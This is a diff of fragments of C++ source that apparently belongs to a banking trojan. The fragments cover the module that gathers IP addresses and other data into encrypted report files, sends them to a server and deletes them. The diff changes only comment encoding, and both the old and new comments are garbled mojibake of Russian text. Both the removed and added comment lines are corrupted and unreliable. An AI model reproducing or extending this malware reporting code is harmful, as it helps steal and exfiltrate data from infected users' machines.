@@ -39,7 +39,7 @@ enum
 //Total strukura to work with the server.
 typedef struct
 {
-  BYTE threadType;                   //One of the values Ð²Ð‚â€¹Ð²Ð‚â€¹TT_ *.
+  BYTE threadType;                   //One of the values â€‹â€‹TT_ *.
   BinStorage::STORAGEARRAY storage;  //Array.
   Crypt::RC4KEY rc4StorageKey;       //The key for the configuration in the repository.
   WCHAR reportFile[MAX_PATH];        //Current file for processing.
@@ -55,10 +55,10 @@ enum
 };
 
 /*
-  Ð˜Ð½Ð¸Ñ†Ð¸Ð°Ð»Ð¸Ð·Ð°Ñ†Ð¸Ñ Ñ„Ð°Ð¹Ð»Ð° Ð¾Ñ‚Ñ‡ÐµÑ‚Ð°. Ð”Ð¾Ð»Ð¶Ð½Ð° Ð²Ñ‹Ð·Ñ‹Ð²Ð°Ñ‚ÑŒÑÑ Ð’Ð¡Ð•Ð“Ð”Ð Ð¿ÐµÑ€ÐµÐ´ Ð½Ð°Ñ‡Ð°Ð»Ð¾Ð¼ Ð¾Ð¿ÐµÑ€Ð°Ñ†Ð¸Ð¸ Ð½Ð° Ñ„Ð°Ð¹Ð»Ð¾Ð¼ Ð¾Ñ‚Ñ‡ÐµÑ‚Ð¾Ð².
+  Èíèöèàëèçàöèÿ ôàéëà îò÷åòà. Äîëæíà âûçûâàòüñÿ ÂÑÅÃÄÀ ïåðåä íà÷àëîì îïåðàöèè íà ôàéëîì îò÷åòîâ.
 
-  IN forWrite  - Ð¸Ð½Ñ„Ð¸Ð¸Ñ†Ð°Ð»Ð¸Ð·Ð°Ñ†Ð¸Ñ Ð´Ð»Ñ Ð·Ð°Ð¿Ð¸ÑÐ¸.
-  OUT tempFile - Ð¸Ð¼Ñ Ð²Ñ€ÐµÐ¼ÐµÐ½Ð½Ð¾Ð³Ð¾ Ñ„Ð°Ð¹Ð»Ð° Ð´Ð»Ñ Ñ‚ÐµÐºÑƒÑ‰ÐµÐ¹ ÑÐµÑÑÐ¸Ð¸. ÐœÐ¾Ð¶ÐµÑ‚ Ð±Ñ‹Ñ‚ÑŒ NULL.
+  IN forWrite  - èíôèèöàëèçàöèÿ äëÿ çàïèñè.
+  OUT tempFile - èìÿ âðåìåííîãî ôàéëà äëÿ òåêóùåé ñåññèè. Ìîæåò áûòü NULL.
 */
 static void initReportFile(bool forWrite, LPWSTR tempFile)
 {
@@ -91,13 +91,13 @@ static void initReportFile(bool forWrite, LPWSTR tempFile)
 }
 
 /*
-  Ð”Ð¾Ð±Ð°Ð²Ð»ÐµÐ½Ð¸Ñ ÑÐ¿Ð¸ÑÐºÐ° IP-Ð°Ð´Ñ€ÐµÑÐ¾Ð² Ð² Ð¾Ñ‚Ñ‡ÐµÑ‚.
+  Äîáàâëåíèÿ ñïèñêà IP-àäðåñîâ â îò÷åò.
 
-  IN OUT binStorage - Ð¾Ñ‚Ñ‡ÐµÑ‚.
-  IN family         - AF_INET Ð¸Ð»Ð¸ AF_INTET6.
+  IN OUT binStorage - îò÷åò.
+  IN family         - AF_INET èëè AF_INTET6.
 
-  Return            - true - Ð² ÑÐ»ÑƒÑ‡Ð°Ð¸ ÑƒÑÐ¿ÐµÑ…Ð°,
-                      false - Ð² ÑÐ»ÑƒÑ‡Ð°Ð¸ Ð¾ÑˆÐ¸Ð±ÐºÐ¸.
+  Return            - true - â ñëó÷àè óñïåõà,
+                      false - â ñëó÷àè îøèáêè.
 */
 static bool addIpAddressesToReport(BinStorage::STORAGE **binStorage, int family)
 {
@@ -313,12 +313,12 @@ static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
     //Deleting a file.
 REMOVE_REPORT_FILE:
     /*
-      Ð’ ÑÐ»ÑƒÑ‡Ð°Ð¸ Ð¾ÑˆÐ¸Ð±ÐºÐ¸ Ð¾Ñ‚ÐºÑ€Ñ‹Ñ‚Ð¸Ñ Ñ„Ð°Ð¹Ð»Ð°, Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½Ð¸Ñ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ð¹ ÐºÐ¾Ð½Ñ„Ð³ÑƒÑ€Ð°Ñ†Ð¸Ð¸, Ð¸Ð»Ð¸ Ð´Ð¾ÑÑ‚Ð¸Ð¶ÐµÐ½Ð¸Ñ ÐºÐ¾Ð½Ñ†Ð° Ñ„Ð°Ð¹Ð»Ð°,
-      Ð¸Ð»Ð¸ Ð¾ÑˆÐ¸Ð±ÐºÐ¸ BinStorage::_Combine(Ð° Ð²Ð´Ñ€ÑƒÐ³ ÑÑƒÐ¼Ð¼Ð°Ñ€Ð½Ñ‹Ð¹ Ñ€Ð°Ð·Ð¼ÐµÑ€ ÐºÐ¾Ð½Ñ„Ð¸Ð³Ð¾Ð² Ð¿Ñ€Ð¸Ð²Ñ‹ÑÐ¸Ð» Ð»Ð¸Ð¼Ð¸Ñ‚ Ð¾Ð´Ð½Ð¾Ð³Ð¾ ÐºÐ¾Ð½Ñ„Ð¸Ð³Ð°),
-      Ð·Ð°Ð²ÐµÑ€ÑˆÐ°ÐµÐ¼ ÑÐµÑÑÐ¸ÑŽ Ð¸ ÑƒÐ´Ð°Ð»ÑÐµÐ¼ Ñ„Ð°Ð¹Ð».
+      Â ñëó÷àè îøèáêè îòêðûòèÿ ôàéëà, ïîëó÷åíèÿ ñëåäóþùèé êîíôãóðàöèè, èëè äîñòèæåíèÿ êîíöà ôàéëà,
+      èëè îøèáêè BinStorage::_Combine(à âäðóã ñóììàðíûé ðàçìåð êîíôèãîâ ïðèâûñèë ëèìèò îäíîãî êîíôèãà),
+      çàâåðøàåì ñåññèþ è óäàëÿåì ôàéë.
 
-      Ð¢Ð°Ðº Ð´ÐµÐ»Ð°ÐµÑ‚ÑÑ Ð´Ð»Ñ Ð¼Ð¸Ð½Ð¸Ð¼Ð¸Ð·Ð°Ñ†Ð¸Ð¸ Ð²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ÑÑ‚Ð¸ Ð¿Ñ€ÐµÐºÑ€Ð°ÑˆÐµÐ½Ð¸Ñ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ¸ Ð¾Ñ‚Ñ‡ÐµÑ‚Ð¾Ð² Ð² ÑÐ»ÑƒÑ‡Ð°Ð¸ ÐºÐ°ÐºÐ¾Ð¹-Ñ‚Ð¾
-      ÑÑ‚Ñ€Ð°Ð½Ð½Ð¾Ð¹ Ð¾ÑˆÐ¸Ð±ÐºÐ¸.
+      Òàê äåëàåòñÿ äëÿ ìèíèìèçàöèè âîçìîæíîñòè ïðåêðàøåíèÿ îòïðàâêè îò÷åòîâ â ñëó÷àè êàêîé-òî
+      ñòðàííîé îøèáêè.
     */
     WDEBUG0(WDDT_INFO, "End of storage file founded, stopping session.");
     BinStorage::_closeStorageArray(&senderData->storage);
@@ -352,14 +352,14 @@ static int defaultSenderResultProc(DWORD loop, Report::SERVERSESSION *session)
   return Report::SSPR_END;
 }
 
-/*Ð’Â Ð’Â Search for a file to upload.
+/*Â Â Search for a file to upload.
 
-Ð’Â Ð’Â OUT fileName - the full path of the file.
-Ð’Â Ð’Â IN tempFile - the full path of the temporary file.
-Ð’Â Ð’Â IN maxDelay - max delay time for the report max (errorDelay, normalDelay).
+Â Â OUT fileName - the full path of the file.
+Â Â IN tempFile - the full path of the temporary file.
+Â Â IN maxDelay - max delay time for the report max (errorDelay, normalDelay).
 
-Ð’Â Ð’Â Return - true - the file is found,
-Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â false - file not found.*/
+Â Â Return - true - the file is found,
+Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â false - file not found.*/
 static bool findReportFileForSending(LPWSTR fileName, LPWSTR tempFile, DWORD maxDelay)
 {
   //Check is not sent out a temporary file.
